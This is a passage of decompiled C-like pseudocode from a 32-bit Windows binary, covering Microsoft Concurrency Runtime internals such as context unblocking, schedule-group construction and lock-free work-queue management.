      (*(void (__thiscall **)(_DWORD))(**(_DWORD **)(this + 156) + 32))(*(_DWORD *)(this + 156));
      LOBYTE(v4) = UserMathErrorFunction();
    }
  }
  else
  {
    if ( !v3 )
    {
      std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVinvalid_oversubscribe_operation_Concurrency__);
    }
    v4 = (_BYTE *)(v3 - 1);
    *(_DWORD *)(this + 20) = v4;
    if ( !v4 )
    {
      v4 = (_BYTE *)sub_47DEF4((volatile signed __int32 *)(this - 4), *(_DWORD *)(this + 160));
      if ( v4 )
        LOBYTE(v4) = sub_47C8B0(v4);
    }
  }
  return (char)v4;
}
// 47783D: using guessed type _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this);

//----- (0047E2E2) --------------------------------------------------------
int __thiscall sub_47E2E2(int this, int a2, int a3, char a4)
{
  int result; // eax
  char v5; // dl

  result = a2;
  v5 = 0;
  *(_BYTE *)(this + 236) = 0;
  *(_DWORD *)(this + 28) = a2;
  if ( a3 )
  {
    if ( a4 )
    {
      result = *(_DWORD *)(a2 + 256);
      if ( (*(_BYTE *)(result + 48) & 4) == 0 )
        _InterlockedIncrement((volatile signed __int32 *)(result + 20));
      v5 = 1;
    }
    *(_BYTE *)(this + 177) = v5;
    *(_DWORD *)(this + 168) = a3;
  }
  else
  {
    result = *(_DWORD *)(a2 + 256);
    if ( (*(_BYTE *)(result + 48) & 4) == 0 )
      _InterlockedIncrement((volatile signed __int32 *)(result + 20));
  }
  return result;
}

//----- (0047E335) --------------------------------------------------------
int __thiscall sub_47E335(int this, int a2)
{
  int result; // eax

  *(_DWORD *)(this + 160) = a2;
  result = this + 44;
  _InterlockedExchange((volatile __int32 *)(this + 44), 0);
  return result;
}

//----- (0047E34C) --------------------------------------------------------
void __thiscall sub_47E34C(int *this, int a2)
{
  int v2; // edi
  int v3; // esi

  v2 = this[1];
  v3 = this[2];
  if ( v2 >= v3 + *this )
  {
    sub_47DF79(this, a2, 0, 0);
  }
  else
  {
    *(_DWORD *)(this[3] + 4 * (v2 & v3)) = a2;
    this[1] = v2 + 1;
  }
}

//----- (0047E38D) --------------------------------------------------------
void __thiscall sub_47E38D(_DWORD *this)
{
  __int32 v2; // ecx
  __int32 v3; // [esp+4h] [ebp-8h] BYREF

  if ( *((_BYTE *)this + 178) )
  {
    v2 = this[40];
    v3 = 0;
    if ( !sub_47C42F(v2, &v3, 15, 1) && !(unsigned __int8)sub_47C4E9((_DWORD **)this[40], (int)this) )
    {
      do
        (*(void (__thiscall **)(_DWORD *))(*this + 32))(this);
      while ( !(unsigned __int8)sub_47C4E9((_DWORD **)this[40], (int)this) );
    }
    *((_BYTE *)this + 178) = 0;
  }
}

//----- (0047E3F6) --------------------------------------------------------
int __thiscall sub_47E3F6(void *this)
{
  UserMathErrorFunction();
  sub_47E5F1((int)this, 3);
  return UserMathErrorFunction();
}

//----- (0047E415) --------------------------------------------------------
void __thiscall sub_47E415(int this)
{
  sub_478536((int *)(this + 4));
  sub_47E5A6((_DWORD *)this, 0, 0);
  *(_DWORD *)(this + 72) = 0;
  *(_BYTE *)(this + 236) = 1;
}

//----- (0047E438) --------------------------------------------------------
int __thiscall sub_47E438(int (__thiscall **this)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD), int a2, int a3, int a4)
{
  return this[18](this + 10, a2, a3, a4, 7);
}

//----- (0047E460) --------------------------------------------------------
int __thiscall sub_47E460(_DWORD *this, int a2)
{
  int result; // eax
  char pExceptionObject[12]; // [esp+0h] [ebp-Ch] BYREF

  result = a2;
  if ( !a2 )
  {
    sub_46A08B(pExceptionObject, (int)"pThreadProxy");
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  this[39] = a2;
  return result;
}

//----- (0047E493) --------------------------------------------------------
char __thiscall sub_47E493(_DWORD *this)
{
  char result; // al
  char v3[8]; // [esp+4h] [ebp-10h] BYREF
  int v4; // [esp+Ch] [ebp-8h]
  void (*v5)(); // [esp+10h] [ebp-4h]

  if ( !this[11] )
  {
    v4 = 0;
    v5 = sub_46FCCB;
    do
      result = sub_46E3D5((int)v3);
    while ( !this[11] );
  }
  return result;
}
// 47E493: using guessed type char var_10[8];

//----- (0047E4BE) --------------------------------------------------------
char __cdecl sub_47E4BE(_DWORD *a1, int a2)
{
  char result; // al
  char v3[8]; // [esp+8h] [ebp-10h] BYREF
  int v4; // [esp+10h] [ebp-8h]
  void (*v5)(); // [esp+14h] [ebp-4h]

  if ( *a1 != a2 )
  {
    v4 = 0;
    v5 = sub_46FCCB;
    do
      result = sub_46E3D5((int)v3);
    while ( *a1 != a2 );
  }
  return result;
}
// 47E4BE: using guessed type char var_10[8];

//----- (0047E4EB) --------------------------------------------------------
int __thiscall sub_47E4EB(int this)
{
  int v2; // eax
  int v3; // esi
  int result; // eax
  int v5; // [esp-Ch] [ebp-28h]
  int v6; // [esp-4h] [ebp-20h]
  int v7; // [esp+Ch] [ebp-10h] BYREF
  int v8; // [esp+14h] [ebp-8h]
  int v9; // [esp+18h] [ebp-4h]

  v9 = 0;
  UserMathErrorFunction();
  v6 = *(_DWORD *)(this + 8);
  v2 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 28) + 4))(*(_DWORD *)(this + 28));
  sub_47890F(5, 4u, v2, v6);
  if ( *(_BYTE *)(*(_DWORD *)(this + 156) + 173) )
  {
    sub_47E5F1(this - 4, 2);
  }
  else
  {
    v3 = *(_DWORD *)(this + 156);
    v5 = *(_DWORD *)(this + 24);
    v7 = 0;
    v8 = 0;
    if ( (*(unsigned __int8 (__thiscall **)(int, int *, int, _DWORD, int))(v3 + 72))(v3 + 40, &v7, v5, 0, 1) )
      sub_47E710((struct _SINGLE_LIST_ENTRY *)(this - 4), v8, 2);
    else
      LOBYTE(v9) = 1;
  }
  result = UserMathErrorFunction();
  if ( (_BYTE)v9 )
    return (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 152) + 12))(*(_DWORD *)(this + 152));
  return result;
}

//----- (0047E5A6) --------------------------------------------------------
void __thiscall sub_47E5A6(_DWORD *this, int a2, char a3)
{
  int v4; // eax

  if ( this[7] )
  {
    sub_47E4BE(this + 57, 0);
    sub_476159(*(void **)(this[7] + 256));
    if ( a3 )
    {
      v4 = *(_DWORD *)(a2 + 256);
      if ( (*(_BYTE *)(v4 + 48) & 4) == 0 )
        _InterlockedIncrement((volatile signed __int32 *)(v4 + 20));
    }
    this[7] = a2;
  }
}

//----- (0047E5F1) --------------------------------------------------------
char __thiscall sub_47E5F1(int this, int a2)
{
  int v3; // edi
  volatile __int32 *v4; // esi
  int v5; // edi
  int v6; // eax
  int v7; // eax
  _DWORD *v8; // esi
  int v10[3]; // [esp-10h] [ebp-28h] BYREF
  int v11; // [esp-4h] [ebp-1Ch]
  int v12; // [esp+Ch] [ebp-Ch] BYREF
  int v13; // [esp+10h] [ebp-8h]
  int v14; // [esp+14h] [ebp-4h]

  v13 = 0;
  v3 = *(_DWORD *)(this + 156);
  v14 = v3;
  if ( *(_DWORD *)(this + 160) )
  {
    sub_47E38D((_DWORD *)this);
    v12 = *(_DWORD *)(*(_DWORD *)(this + 160) + 192);
    UserMathErrorFunction();
    (*(void (__thiscall **)(_DWORD))(**(_DWORD **)(this + 160) + 12))(*(_DWORD *)(this + 160));
    v4 = (volatile __int32 *)(this + 44);
    *(_DWORD *)(this + 160) = 0;
    if ( a2 )
    {
      UserMathErrorFunction();
      _InterlockedExchange(v4, 1);
    }
    else
    {
      v5 = *(_DWORD *)(this + 32);
      v11 = *(_DWORD *)(this + 12);
      v6 = (*(int (__thiscall **)(int))(*(_DWORD *)v5 + 4))(v5);
      sub_47890F(6, 4u, v6, v11);
      sub_47FD2E(*(_DWORD **)(this + 28), (struct _SINGLE_LIST_ENTRY *)this);
      v4 = (volatile __int32 *)(this + 44);
    }
    sub_47756E(*(_DWORD *)(this + 32), &v12);
    sub_47764B(*(volatile signed __int32 **)(this + 32), 0);
    LOBYTE(v7) = *(_BYTE *)(this + 176);
    v13 = v7;
    if ( !a2 )
      _InterlockedExchange(v4, 1);
    v3 = v14;
  }
  if ( a2 == 2 || a2 == 3 )
  {
    v8 = *(_DWORD **)(this + 28);
    sub_4777A9(v10, v8 + 3);
    sub_47F548(v8, this, v10[0], v10[1], v10[2], v11);
  }
  if ( a2 )
    (*(void (__thiscall **)(int, int))(*(_DWORD *)v3 + 8))(v3, 1);
  return v13;
}
// 47E6BB: variable 'v7' is possibly undefined

//----- (0047E710) --------------------------------------------------------
int __thiscall sub_47E710(struct _SINGLE_LIST_ENTRY *this, int a2, int a3)
{
  struct _SINGLE_LIST_ENTRY *v3; // edi
  int v4; // ebx
  struct _SINGLE_LIST_ENTRY *Next; // esi
  struct _SINGLE_LIST_ENTRY *v6; // edi
  int v7; // eax
  struct _SINGLE_LIST_ENTRY *v8; // ecx
  int v9; // eax
  __int32 v10; // edx
  struct _SINGLE_LIST_ENTRY *v11; // edi
  int result; // eax
  int v13[3]; // [esp-10h] [ebp-30h] BYREF
  struct _SINGLE_LIST_ENTRY *v14; // [esp-4h] [ebp-24h]
  struct _SINGLE_LIST_ENTRY *v15; // [esp+Ch] [ebp-14h]
  struct _SINGLE_LIST_ENTRY *v16; // [esp+10h] [ebp-10h]
  struct _SINGLE_LIST_ENTRY *v17; // [esp+14h] [ebp-Ch]
  int v18; // [esp+18h] [ebp-8h]
  struct _SINGLE_LIST_ENTRY *v19; // [esp+1Ch] [ebp-4h]

  v3 = this;
  v4 = 1;
  v19 = this;
  if ( a3 )
  {
    if ( a3 != 1 )
    {
      if ( a3 == 2 )
      {
        Next = this[7].Next;
        sub_4777A9(v13, &Next[3].Next);
        sub_47F548(Next, (int)v3, v13[0], v13[1], v13[2], (int)v14);
      }
      else if ( a3 == 3 )
      {
        v4 = 2;
      }
    }
  }
  else
  {
    v6 = this[8].Next;
    v14 = this[3].Next;
    v7 = ((int (__thiscall *)(struct _SINGLE_LIST_ENTRY *))v6->Next[1].Next)(v6);
    sub_47890F(6, 4u, v7, (int)v14);
    v3 = v19;
    sub_47FD2E(&v19[7].Next->Next, v19);
    v4 = 0;
  }
  v15 = v3 + 1;
  UserMathErrorFunction();
  v8 = v3[40].Next;
  v16 = v3[8].Next;
  v3[40].Next = 0;
  v17 = v3[39].Next;
  v9 = a2;
  v19 = v8;
  v18 = a2;
  if ( !a2 )
  {
    v18 = ((int (__thiscall *)(struct _SINGLE_LIST_ENTRY *))v8->Next[1].Next)(v19);
    v9 = 0;
  }
  v10 = _InterlockedExchange((volatile __int32 *)&v3[11], 1);
  v11 = v19;
  ((void (__fastcall *)(struct _SINGLE_LIST_ENTRY *, __int32, int))v19->Next[4].Next)(v19, v10, v9);
  if ( v18 )
  {
    result = ((int (__thiscall *)(struct _SINGLE_LIST_ENTRY *, int, int))v17->Next[1].Next)(v17, v18, v4);
  }
  else
  {
    sub_47C840((int)v11, 4, 1);
    sub_474EFC((int)v16);
    result = ((int (__thiscall *)(struct _SINGLE_LIST_ENTRY *, int))v17->Next[2].Next)(v17, v4);
  }
  if ( a3 )
    return UserMathErrorFunction();
  return result;
}

//----- (0047E855) --------------------------------------------------------
int __fastcall sub_47E855(int a1)
{
  signed __int32 v2; // eax
  int v3; // edi
  int v4; // eax
  int (__thiscall *v5)(int, int, int, int, _ThrowInfo *); // esi
  int result; // eax
  char *v7; // eax
  int v8[3]; // [esp-10h] [ebp-38h] BYREF
  _ThrowInfo *v9; // [esp-4h] [ebp-2Ch]
  char pExceptionObject[12]; // [esp+Ch] [ebp-1Ch] BYREF
  char v11[12]; // [esp+18h] [ebp-10h] BYREF
  int v12; // [esp+24h] [ebp-4h]

  if ( (LPVOID)(a1 != 4 ? a1 : 0) == sub_475051() )
  {
    std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
    v9 = (_ThrowInfo *)&_TI2_AVcontext_self_unblock_Concurrency__;
    v7 = pExceptionObject;
    goto LABEL_8;
  }
  v2 = _InterlockedDecrement((volatile signed __int32 *)(a1 + 44));
  v3 = *(_DWORD *)(a1 + 28);
  v9 = *(_ThrowInfo **)(a1 + 8);
  v12 = v2;
  v4 = (*(int (__thiscall **)(int))(*(_DWORD *)v3 + 4))(v3);
  sub_47890F(4, 4u, v4, (int)v9);
  if ( v12 == 1 )
  {
    *(_DWORD *)(a1 + 44) = 0;
    sub_47E493((_DWORD *)(a1 - 4));
    v5 = *(int (__thiscall **)(int, int, int, int, _ThrowInfo *))(*(_DWORD *)(a1 - 4) + 20);
    sub_4777A9(v8, (_DWORD *)(*(_DWORD *)(a1 + 24) + 12));
    return v5(a1 - 4, v8[0], v8[1], v8[2], v9);
  }
  result = v12 + 1;
  if ( v12 != -1 && v12 != 0 )
  {
    std::bad_function_call::bad_function_call((std::bad_function_call *)v11);
    v9 = (_ThrowInfo *)&_TI2_AVcontext_unblock_unbalanced_Concurrency__;
    v7 = v11;
LABEL_8:
    _CxxThrowException(v7, v9);
  }
  return result;
}
// 4777DE: using guessed type _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this);
// 4777EF: using guessed type _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this);
// 4E545C: using guessed type __TI_flags _TI2_AVcontext_self_unblock_Concurrency__;

//----- (0047E914) --------------------------------------------------------
int __thiscall sub_47E914(_DWORD *this)
{
  unsigned int v2; // eax
  _DWORD *v3; // edi
  unsigned int v4; // esi
  int v5; // ecx
  int result; // eax
  bool v7; // zf

  v2 = ++this[43];
  if ( v2 == 1 )
  {
    v3 = (_DWORD *)this[8];
    v4 = *(_DWORD *)(this[40] + 144);
    sub_47C7FC(v3 + 15, v4);
    sub_47C4C4(v3, v4);
    v2 = this[43];
  }
  if ( v2 < 0x100 )
    return (*(int (__thiscall **)(_DWORD))(*(_DWORD *)this[39] + 12))(this[39]);
  if ( v2 == 256 )
  {
    v5 = this[40];
    *((_BYTE *)this + 178) = 1;
    sub_47C840(v5, 2, 1);
    return sub_47C52C((_DWORD **)this[40], (int)this);
  }
  if ( (*((_BYTE *)this + 179) & 2) != 0 )
  {
    this[43] = v2 - 1;
    return (*(int (__thiscall **)(_DWORD))(*(_DWORD *)this[39] + 12))(this[39]);
  }
  sub_4776FF(this[8], 1);
  while ( !(unsigned __int8)sub_47C4E9((_DWORD **)this[40], (int)this) )
    (*(void (__thiscall **)(_DWORD *))(*this + 32))(this);
  result = sub_4776FF(this[8], 0);
  v7 = this[43] == 0;
  *((_BYTE *)this + 178) = 0;
  if ( !v7 )
    result = sub_47C7BC((_DWORD *)(this[8] + 60), *(_DWORD *)(this[40] + 144));
  this[43] = 0;
  return result;
}

//----- (0047EA14) --------------------------------------------------------
char __thiscall sub_47EA14(int this, int a2)
{
  if ( !(unsigned __int8)sub_47E438(
                           *(int (__thiscall ***)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))(this + 160),
                           a2,
                           *(_DWORD *)(this + 28),
                           *(unsigned __int8 *)(this + 178)) )
    return 0;
  sub_47E38D((_DWORD *)this);
  if ( *(_DWORD *)(this + 172) )
    sub_47C7BC((_DWORD *)(*(_DWORD *)(this + 32) + 60), *(_DWORD *)(*(_DWORD *)(this + 160) + 144));
  *(_DWORD *)(this + 172) = 0;
  return 1;
}

//----- (0047EA70) --------------------------------------------------------
int __thiscall sub_47EA70(int this)
{
  int v2; // eax
  int v3; // esi
  struct _SINGLE_LIST_ENTRY *v4; // esi
  int result; // eax
  int v6; // [esp-Ch] [ebp-2Ch]
  int v7; // [esp-4h] [ebp-24h]
  int v8[2]; // [esp+Ch] [ebp-14h] BYREF
  struct _SINGLE_LIST_ENTRY *v9; // [esp+14h] [ebp-Ch]
  int v10; // [esp+18h] [ebp-8h]
  struct _SINGLE_LIST_ENTRY *v11; // [esp+1Ch] [ebp-4h]

  v10 = 0;
  UserMathErrorFunction();
  v7 = *(_DWORD *)(this + 8);
  v2 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 28) + 4))(*(_DWORD *)(this + 28));
  sub_47890F(5, 4u, v2, v7);
  if ( *(_BYTE *)(*(_DWORD *)(this + 156) + 173) )
  {
    sub_47E5F1(this - 4, 2);
    goto LABEL_19;
  }
  v3 = *(_DWORD *)(this + 156);
  v6 = *(_DWORD *)(this + 24);
  v8[0] = 0;
  v9 = 0;
  if ( !(*(unsigned __int8 (__thiscall **)(int, int *, int, _DWORD, int))(v3 + 76))(v3 + 40, v8, v6, 0, 9) )
    goto LABEL_18;
  if ( v8[0] == 1 )
  {
LABEL_12:
    v4 = v9;
    goto LABEL_13;
  }
  UserMathErrorFunction();
  v4 = (struct _SINGLE_LIST_ENTRY *)sub_47569E(*(_DWORD *)(this + 28), 1);
  v11 = v4;
  UserMathErrorFunction();
  if ( v4 )
  {
    if ( sub_482513(v8) )
    {
LABEL_7:
      sub_481EEF(v8, (int)v4);
      goto LABEL_13;
    }
    if ( (*(unsigned __int8 (__thiscall **)(int, int *, _DWORD, _DWORD, int))(*(_DWORD *)(this + 156) + 76))(
           *(_DWORD *)(this + 156) + 40,
           v8,
           *(_DWORD *)(this + 24),
           0,
           3) )
    {
      if ( v8[0] != 1 )
      {
        v4 = v11;
        goto LABEL_7;
      }
      sub_476924(*(_DWORD *)(this + 28), v11, 1);
      goto LABEL_12;
    }
    sub_476924(*(_DWORD *)(this + 28), v11, 1);
    v4 = 0;
  }
  else
  {
    if ( !(*(unsigned __int8 (__thiscall **)(int, int *, _DWORD, _DWORD, int))(*(_DWORD *)(this + 156) + 76))(
            *(_DWORD *)(this + 156) + 40,
            v8,
            *(_DWORD *)(this + 24),
            0,
            1) )
      goto LABEL_18;
    v4 = (struct _SINGLE_LIST_ENTRY *)sub_481EA2(v8);
  }
LABEL_13:
  if ( v4 )
  {
    sub_47E710((struct _SINGLE_LIST_ENTRY *)(this - 4), (int)v4, 2);
    goto LABEL_19;
  }
LABEL_18:
  LOBYTE(v10) = 1;
LABEL_19:
  result = UserMathErrorFunction();
  if ( (_BYTE)v10 )
    return (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 152) + 12))(*(_DWORD *)(this + 152));
  return result;
}

//----- (0047EBF4) --------------------------------------------------------
union _SLIST_HEADER *__thiscall sub_47EBF4(union _SLIST_HEADER *this, int a2, struct _SINGLE_LIST_ENTRY *a3)
{
  char *v4; // ecx
  int v6[7]; // [esp+10h] [ebp-20h] BYREF
  int v7; // [esp+2Ch] [ebp-4h]

  v6[4] = (int)this;
  *(_DWORD *)&this->Depth = 0;
  this[1].Next.Next = 0;
  this->Next.Next = (struct _SINGLE_LIST_ENTRY *)a2;
  sub_473CA7(this + 2, a2, 256, 64);
  v7 = 0;
  sub_473CA7(this + 12, a2, 256, 64);
  this[23].Next.Next = a3;
  this[22].Next.Next = 0;
  *(_DWORD *)&this[22].Depth = 0;
  *(_DWORD *)&this[23].Depth = 0;
  memset(v6, 0, 16);
  v4 = *(char **)(a2 + 176);
  LOBYTE(v7) = 1;
  this[1].Next.Next = (struct _SINGLE_LIST_ENTRY *)sub_47F681(v4, v6, (int)this);
  return this;
}

//----- (0047EC7D) --------------------------------------------------------
void __thiscall sub_47EC7D(PSLIST_HEADER ListHead)
{
  PSLIST_ENTRY v2; // eax
  PSLIST_ENTRY v3; // eax
  struct _SINGLE_LIST_ENTRY *Next; // ebx
  int i; // esi
  struct _SINGLE_LIST_ENTRY *v6; // esi

  v2 = InterlockedFlushSList(ListHead);
  sub_47ED4A(v2);
  v3 = InterlockedFlushSList(ListHead + 1);
  sub_47ED4A(v3);
  sub_47ED4A(&ListHead[2].Next.Next->Next);
  Next = ListHead[6].Next.Next;
  if ( Next )
  {
    do
    {
      for ( i = 0; i < (int)ListHead[5].Next.Next; ++i )
        sub_47C1E2(Next->Next[i].Next);
      v6 = Next[1].Next;
      j_j_j___free_base(Next->Next);
      sub_46C87D(Next);
      Next = v6;
    }
    while ( v6 );
  }
  j_j_j___free_base(*(void **)&ListHead[6].Depth);
}

//----- (0047ECF4) --------------------------------------------------------
void __thiscall sub_47ECF4(union _SLIST_HEADER *this)
{
  this[1].Next.Next = 0;
  sub_47EC7D(this + 12);
  sub_47EC7D(this + 2);
}

//----- (0047ED0C) --------------------------------------------------------
volatile __int32 *__thiscall sub_47ED0C(volatile __int32 *this)
{
  volatile __int32 *result; // eax

  result = this + 47;
  _InterlockedExchange(this + 47, 1);
  return result;
}

//----- (0047ED3E) --------------------------------------------------------
char __cdecl sub_47ED3E(int a1)
{
  char result; // al

  result = sub_475B2C(*(_DWORD **)(a1 + 36));
  if ( !result )
  {
    sub_47ED4A(*(_DWORD **)(a1 + 16));
    *(_DWORD *)(a1 + 16) = 0;
    result = a1 + 72;
    _InterlockedExchange((volatile __int32 *)(a1 + 72), 0);
  }
  return result;
}

//----- (0047ED4A) --------------------------------------------------------
int __stdcall sub_47ED4A(_DWORD *a1)
{
  int (__thiscall ***v2)(_DWORD, int); // eax
  int result; // eax

  while ( a1 )
  {
    v2 = (int (__thiscall ***)(_DWORD, int))(a1 - 72);
    a1 = (_DWORD *)*a1;
    result = sub_47C1E2(v2);
  }
  return result;
}

//----- (0047ED6B) --------------------------------------------------------
char __thiscall sub_47ED6B(PSLIST_HEADER ListHead, signed __int32 a2, int a3, char a4)
{
  int v5; // eax
  int v6; // ebx
  struct _SINGLE_LIST_ENTRY *Next; // ecx
  int v8; // edi
  int v9; // eax
  int v10; // edi
  int v11; // eax
  USHORT DepthSList; // ax
  struct _SINGLE_LIST_ENTRY *v13; // eax
  struct _SINGLE_LIST_ENTRY *v15; // [esp-4h] [ebp-18h]
  int v16; // [esp-4h] [ebp-18h]

  v5 = a3 >> *(_DWORD *)&ListHead[5].Depth;
  v6 = a3 & ((int)&ListHead[5].Next.Next[-1].Next + 3);
  if ( v5 >= *(_DWORD *)&ListHead[7].Depth )
    return 0;
  Next = ListHead[7].Next.Next;
  v8 = *(_DWORD *)&ListHead[6].Depth;
  if ( v5 < (int)Next )
  {
    v10 = *(_DWORD *)(v8 + 4 * v5);
  }
  else
  {
    v9 = v5 - (_DWORD)Next;
    v10 = *(_DWORD *)(v8 + 4 * (_DWORD)Next - 4);
    if ( v9 >= 0 )
    {
      v11 = v9 + 1;
      do
      {
        v10 = *(_DWORD *)(v10 + 4);
        --v11;
      }
      while ( v11 );
    }
  }
  if ( _InterlockedCompareExchange((volatile signed __int32 *)(*(_DWORD *)v10 + 4 * v6), 0, a2) != a2 )
    return 0;
  _InterlockedCompareExchange((volatile signed __int32 *)(v10 + 8), v6, -2);
  if ( a4 )
  {
    DepthSList = QueryDepthSList(ListHead);
    v15 = (struct _SINGLE_LIST_ENTRY *)(a2 + 288);
    if ( DepthSList <= *(int *)&ListHead[8].Depth )
    {
      InterlockedPushEntrySList(ListHead, v15);
    }
    else
    {
      InterlockedPushEntrySList(ListHead + 1, v15);
      if ( QueryDepthSList(ListHead + 1) > *(int *)&ListHead[8].Depth
        && !sub_475B2C(*(_DWORD **)&ListHead[4].Depth)
        && !_InterlockedCompareExchange((volatile signed __int32 *)&ListHead[9], 1, 0) )
      {
        v13 = InterlockedFlushSList(ListHead + 1);
        v16 = *(_DWORD *)&ListHead[4].Depth;
        ListHead[2].Next.Next = v13;
        sub_4761CF(
          (int (__cdecl **)(int))&ListHead[2].Depth,
          (int (__cdecl *)(int))sub_47ED3E,
          (int (__cdecl *)(int))ListHead,
          v16);
      }
    }
  }
  return 1;
}

//----- (0047EE5F) --------------------------------------------------------
char __thiscall sub_47EE5F(char *this, signed __int32 a2)
{
  return sub_47ED6B(
           (PSLIST_HEADER)&this[((*(_DWORD *)(a2 + 12) & 0xFFFFFFF) != 0 ? 0xFFFFFFB0 : 0) + 96],
           a2,
           *(_DWORD *)(a2 + 248),
           1);
}

//----- (0047EE8E) --------------------------------------------------------
int *__thiscall sub_47EE8E(int *this, int a2, int a3, char a4, unsigned int a5)
{
  int v6; // ebx
  _DWORD *v7; // edi
  _DWORD *v8; // eax

  v6 = (int)(this + 1);
  v7 = 0;
  *this = a2;
  this[1] = 0;
  this[2] = 0;
  this[3] = a5;
  this[4] = 0;
  this[5] = 0;
  this[6] = 0;
  this[7] = 0;
  this[8] = 0;
  sub_47FA92(this, (int)(this + 1));
  if ( !a4 )
  {
    v8 = operator new(0x2Cu);
    if ( v8 )
      v7 = sub_47F01F(v8, *this, v6, a5, 0);
    this[4] = (int)v7;
    this[5] = (int)v7;
  }
  return this;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (0047EF05) --------------------------------------------------------
int __thiscall sub_47EF05(int this, int a2, _DWORD *a3)
{
  *(_DWORD *)this = &Concurrency::details::ScheduleGroupBase::`vftable';
  *(_DWORD *)(this + 4) = a2;
  *(_DWORD *)(this + 8) = 0;
  *(_DWORD *)(this + 12) = 0;
  *(_DWORD *)(this + 16) = 0;
  *(_DWORD *)(this + 20) = 0;
  *(_DWORD *)(this + 32) = 0;
  *(_DWORD *)(this + 36) = 0;
  *(_DWORD *)(this + 40) = 0;
  *(_DWORD *)(this + 44) = 0;
  sub_47FABB((int *)this, a3);
  *(_DWORD *)(this + 28) = sub_4757CE(*(volatile signed __int32 **)(this + 4));
  return this;
}
// 4C1314: using guessed type void *Concurrency::details::ScheduleGroupBase::`vftable';

//----- (0047EF5E) --------------------------------------------------------
_DWORD *__thiscall sub_47EF5E(_DWORD *this, int a2, int a3, _DWORD *a4)
{
  _DWORD *v5; // eax
  int v7; // [esp-10h] [ebp-38h]
  int v8; // [esp-Ch] [ebp-34h]
  void *v9[5]; // [esp+10h] [ebp-18h] BYREF
  int v10; // [esp+24h] [ebp-4h]

  v9[2] = this;
  *this = &Concurrency::details::ScheduleGroupSegmentBase::`vftable';
  this[3] = 0;
  this[4] = 0;
  this[5] = 0;
  this[6] = 0;
  this[7] = 0;
  this[8] = 0;
  this[10] = 0;
  this[11] = this + 10;
  this[12] = 0;
  v10 = 0;
  v5 = sub_4754EB(*(unsigned int **)(a2 + 4), v9, this + 3);
  v7 = *(_DWORD *)(a2 + 4);
  LOBYTE(v10) = 1;
  sub_47EE8E(this + 13, v7, (int)v5, 0, 0x40u);
  LOBYTE(v10) = 3;
  j_j_j___free_base(v9[1]);
  sub_473CA7((PSLIST_HEADER)this + 11, *(_DWORD *)(a2 + 4), 256, 64);
  v8 = *(_DWORD *)(a2 + 4);
  LOBYTE(v10) = 4;
  sub_473CA7((PSLIST_HEADER)this + 21, v8, 256, 0x7FFFFFFF);
  this[66] = 0;
  this[67] = 0;
  LOBYTE(v10) = 5;
  sub_47FACE((int)this, a2, a3, a4);
  return this;
}
// 4C1300: using guessed type void *Concurrency::details::ScheduleGroupSegmentBase::`vftable';

//----- (0047F01F) --------------------------------------------------------
_DWORD *__thiscall sub_47F01F(_DWORD *this, int a2, int a3, unsigned int a4, int a5)
{
  _DWORD *v6; // ecx
  void *v7; // eax

  v6 = this + 1;
  *this = a2;
  *v6 = 0;
  v6[1] = 0;
  sub_474E2B((int)v6, a3);
  this[4] = a5;
  this[5] = 0;
  this[6] = 0;
  v7 = (void *)unknown_libname_28((unsigned __int64)a4 >> 30 != 0 ? -1 : 4 * a4);
  this[3] = v7;
  memset(v7, 0, 4 * a4);
  return this;
}
// 46D404: using guessed type int __cdecl unknown_libname_28(_DWORD);

//----- (0047F08B) --------------------------------------------------------
void __thiscall sub_47F08B(PSLIST_HEADER ListHead)
{
  PSLIST_ENTRY v2; // eax
  PSLIST_ENTRY v3; // eax
  struct _SINGLE_LIST_ENTRY *Next; // ebx
  int i; // esi
  struct _SINGLE_LIST_ENTRY *v6; // esi

  v2 = InterlockedFlushSList(ListHead);
  sub_47F732(v2);
  v3 = InterlockedFlushSList(ListHead + 1);
  sub_47F732(v3);
  sub_47F732(&ListHead[2].Next.Next->Next);
  Next = ListHead[6].Next.Next;
  if ( Next )
  {
    do
    {
      for ( i = 0; i < (int)ListHead[5].Next.Next; ++i )
        sub_46C87D(Next->Next[i].Next);
      v6 = Next[1].Next;
      j_j_j___free_base(Next->Next);
      sub_46C87D(Next);
      Next = v6;
    }
    while ( v6 );
  }
  j_j_j___free_base(*(void **)&ListHead[6].Depth);
}

//----- (0047F105) --------------------------------------------------------
void __thiscall sub_47F105(PSLIST_HEADER ListHead)
{
  PSLIST_ENTRY v2; // eax
  PSLIST_ENTRY v3; // eax
  struct _SINGLE_LIST_ENTRY *Next; // ebx
  int i; // esi
  void **p_Next; // ecx
  struct _SINGLE_LIST_ENTRY *v7; // esi

  v2 = InterlockedFlushSList(ListHead);
  sub_478070(v2);
  v3 = InterlockedFlushSList(ListHead + 1);
  sub_478070(v3);
  sub_478070(&ListHead[2].Next.Next->Next);
  Next = ListHead[6].Next.Next;
  if ( Next )
  {
    do
    {
      for ( i = 0; i < (int)ListHead[5].Next.Next; ++i )
      {
        p_Next = (void **)&Next->Next[i].Next->Next;
        if ( p_Next )
          sub_477B7B(p_Next, 1);
      }
      v7 = Next[1].Next;
      j_j_j___free_base(Next->Next);
      sub_46C87D(Next);
      Next = v7;
    }
    while ( v7 );
  }
  j_j_j___free_base(*(void **)&ListHead[6].Depth);
}

//----- (0047F181) --------------------------------------------------------
void __thiscall sub_47F181(int this)
{
  int v2; // ecx
  int v3; // edi

  v2 = *(_DWORD *)(this + 20);
  if ( v2 )
  {
    do
    {
      v3 = *(_DWORD *)(v2 + 24);
      if ( v2 == *(_DWORD *)(this + 16) )
        sub_48009C(v2, *(_DWORD *)(this + 28) - *(_DWORD *)(v2 + 16));
      else
        sub_48009C(v2, *(_DWORD *)(this + 12));
      v2 = v3;
    }
